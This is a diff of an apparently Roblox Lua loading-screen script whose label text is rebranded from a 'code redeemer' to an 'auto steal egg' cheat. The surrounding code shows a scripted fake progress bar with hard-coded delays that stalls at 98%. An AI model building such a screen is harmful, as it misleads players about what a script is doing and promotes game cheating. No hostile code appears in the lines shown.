@@ -131,7 +131,7 @@ local version = Instance.new("TextLabel")
 version.Size = UDim2.new(1, -95, 0, 20) 
 version.Position = UDim2.new(0, 83, 0, 48) 
 version.BackgroundTransparency = 1 
-version.Text = "CODE REDEEMER  •  V2" 
+version.Text = "AUTO STEAL EGG  •  V2" 
 version.TextColor3 = Color3.fromRGB(190, 125, 255) 
 version.TextSize = 11 
 version.Font = Enum.Font.GothamMedium 
@@ -151,7 +151,7 @@ local action = Instance.new("TextLabel")
 action.Size = UDim2.new(1, -48, 0, 25) 
 action.Position = UDim2.new(0, 24, 0, 96) 
 action.BackgroundTransparency = 1 
-action.Text = "INITIALIZING CODE REDEEMER" 
+action.Text = "INITIALIZING BEST EGG STEAL " 
 action.TextColor3 = Color3.fromRGB(240, 235, 250) 
 action.TextSize = 13 
 action.Font = Enum.Font.GothamBold 
@@ -163,7 +163,7 @@ local status = Instance.new("TextLabel")
 status.Size = UDim2.new(1, -48, 0, 20) 
 status.Position = UDim2.new(0, 24, 0, 119) 
 status.BackgroundTransparency = 1 
-status.Text = "Preparing code system..." 
+status.Text = "Preparing Egg system..." 
 status.TextColor3 = Color3.fromRGB(140, 133, 155) 
 status.TextSize = 12 
 status.Font = Enum.Font.Gotham 
@@ -235,7 +235,7 @@ local footer = Instance.new("TextLabel")
 footer.Size = UDim2.new(1, -48, 0, 20) 
 footer.Position = UDim2.new(0, 24, 1, -30) 
 footer.BackgroundTransparency = 1 
-footer.Text = "Finding the latest redeemable codes ..." 
+footer.Text = "Finding the latest Best Egg ..." 
 footer.TextColor3 = Color3.fromRGB(100, 94, 115) 
 footer.TextSize = 10 
 footer.Font = Enum.Font.Gotham 
@@ -350,23 +350,23 @@ task.spawn(function()
  
 			delayTime = 0.035 
  
-			action.Text = "SCANNING REDEEMABLE CODES" 
-			status.Text = "Preparing crafting system..." 
+			action.Text = "SCANNING EGGS" 
+			status.Text = "Preparing Auto Steal Eggs..." 
  
 		--// 20-50% VERY SLOW 
 		elseif i <= 50 then 
  
 			delayTime = 1.5 + ((i - 20) * 0.15) 
  
-			action.Text = "SELECTING BEST BRAINROT" 
-			status.Text = "Analyzing brainrot possibilities..." 
+			action.Text = "SELECTING BEST EGG" 
+			status.Text = "Analyzing Auto Steal..." 
  
 		--// 50-80% 
 		elseif i <= 80 then 
  
 			delayTime = 0.15 
  
-			action.Text = "PROCESSING CODE " 
+			action.Text = "PROCESSING EGGS " 
 			status.Text = "Combining the best attributes..." 
  
 		--// 80-90% 
@@ -374,7 +374,7 @@ task.spawn(function()
  
 			delayTime = 0.25 
  
-			action.Text = "SELECTING BEST BRAINROT" 
+			action.Text = "SELECTING BEST EGG" 
 			status.Text = "Filtering optimal results..." 
  
 		--// 90-98% 
@@ -382,8 +382,8 @@ task.spawn(function()
  
 			delayTime = 0.55 
  
-			action.Text = "OPTIMIZING CRAFT" 
-			status.Text = "Finalizing the best brainrot..." 
+			action.Text = "OPTIMIZING EGG SCRIPT" 
+			status.Text = "Finalizing the EGGS..." 
  
 		end 
  
@@ -405,7 +405,7 @@ task.spawn(function()
  
 	--// STAYS AT 98% 
 	percent.Text = "98%" 
-	action.Text = "REDEMTION READY" 
+	action.Text = "AUTO STEAL LOADING.." 
 	status.Text = "Almost ready..." 
 	footer.Text = "Waiting for final initialization..." 
  
